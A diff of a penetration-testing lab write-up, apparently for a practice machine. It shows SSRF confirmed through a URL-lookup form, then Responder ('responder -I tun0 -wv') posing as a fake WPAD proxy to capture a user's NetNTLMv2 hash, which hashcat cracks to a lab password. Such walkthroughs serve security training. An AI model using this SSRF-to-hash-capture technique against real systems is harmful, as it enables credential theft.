@@ -350,52 +350,60 @@ Enumerated top 200 UDP ports:
 # Enumeration
 ## Port 8080
 
-#### -Navigated to "http://192.168.231.165:8080/" and found the following webpage:
+- We click the search icon after entering the following in the "Enter URL" bar.
+
+http://[Kali IP]:445
 
 ![](Images/Pasted%20image%2020221012174609.png)
 
 
-#### -Typed "updog -p 445" on kali machine to fire up an HTTP Server
+- On our Kali machine, we enter "updog -p 445" to launch an HTTP server.
+  
+- We click the search icon after entering the following in the "Enter URL" bar.
 
-#### - Typed "http://[Kali IP]:445" into the "Enter URL" bar and clicked the search icon
+http://[Kali IP]:445
 
 ![](Images/Pasted%20image%2020221012174728.png)
 
-#### - I was able to access my server. This confirmed that this server is vulnerable to SSRF
-
+- We can access our HTTP server. This confirmed an SSRF vulnerability
+  
 ![](Images/Pasted%20image%2020221012174847.png)
 ![](Images/Pasted%20image%2020221012180025.png)
 #SSRFvulnerability
 
-#### - Clicking on any of my files makes the URL try to navigate to it as a sub directory off of the main page; for example clicking on utils.py file brings us to "http://192.168.231.165:8080/utils.py" which obviously doesn't exist:
+We notice that the URL would navigate to the file but it would not execute the file. This gave us an idea that we might be able to use Responder to exploit the SSRF vulnerability and intercept authorization credentials.
 
+- The following webpage appears when we click the utils.py file on our web server.
+  
 ![](Images/Pasted%20image%2020221012181158.png)
 
-#### - However, by adding the filename in the initial search it reads the file I select but does not execute it.
-
+- We add the filename to the initial search, however, causes it to read the file we choose but not to execute it.
+  
 ![](Images/Pasted%20image%2020221012181305.png)
 
 ![](Images/Pasted%20image%2020221012181352.png)
 
-#### - It appears we will not be able to get command execution by accessing files on our web server directly; however, the second part of the description on SSRF attacks above seems interesting: In some cases, an SSRF vulnerability may allow an attacker to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. 
+- An attacker may occasionally be able to cause the server to connect to random external systems by exploiting an SSRF vulnerability. This could expose private information, including login passwords.
 
-#### A specific tool that can be used to intercept authorization credentials when an arbitrary connection is made to a system is **Responder**.
+- Responder is a specialized tool that can be used to intercept authorization credentials when a system is connected arbitrarily.
 
-#### - With this information, we should be able to setup Responder to create a spoofed WPAD proxy server and then search for an arbitrary domain using the URL search bar on the web server. After the request is made, we should see responder intercept the request and dump the hash of the user who owns the webserver.
+- With this data, we should be able to configure Responder to generate a fake WPAD proxy server and use the web server's URL search bar to look up any domain. Once the request is sent, the responder should intercept it and release the user's hash for the web server.
 
 ---
 
 # Exploitation
-## Recieve username and NetNTLMv2 hashed password utilizing Responder
+### SSRF Leading To Retreiving Username And NTLMv2 Hash Through Responder
 
-#### - Fire up Responder with the following command:
+We set up Responder on our machine with the following command: "responder -I tun0 -wv". We then send a request to our IP on a port that is not open, which results in a NetNTLMv2 hashed password for the user "enox" being dumped into the Responder output. We crack the hashed password utilizing hashcat, which reveals the password "california".
+
+-The following command is used to launch Responder:
 
 responder -I tun0 -wv
 
 #responder
 
-#### - Next, we need to send a request to our IP on a port that is not open and we should get a hash in our Responder window. For this example, I just forwarded the request to my IP without specifying a port since my web server is on port 445 and this request will target port 80, which is not open.
-
+- We forward a request to our Kali IP on port 80, which did not show as open in our previous rustscan.
+  
 ![](Images/Pasted%20image%2020221012181516.png)
 
 #### - After sending the request we receive a NetNTLMv2 hash for the user **enox** comes in to our Responder output.
